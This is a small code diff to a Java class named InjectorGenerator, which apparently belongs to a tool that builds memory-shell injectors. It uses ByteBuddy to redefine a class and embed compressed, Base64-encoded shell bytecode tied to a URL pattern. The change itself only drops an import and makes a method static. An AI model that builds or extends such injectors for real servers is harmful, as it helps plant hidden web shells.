@@ -6,7 +6,6 @@ import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import net.bytebuddy.implementation.FixedValue;
 import org.apache.commons.codec.binary.Base64;
-import org.apache.commons.lang3.StringUtils;
 
 import java.util.Objects;
 
@@ -19,7 +18,7 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
 public class InjectorGenerator {
 
     @SneakyThrows
-    public byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern) {
+    public static byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern) {
         String base64String = Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), "");;
         try (DynamicType.Unloaded<?> make = new ByteBuddy()
                 .redefine(injectClass)
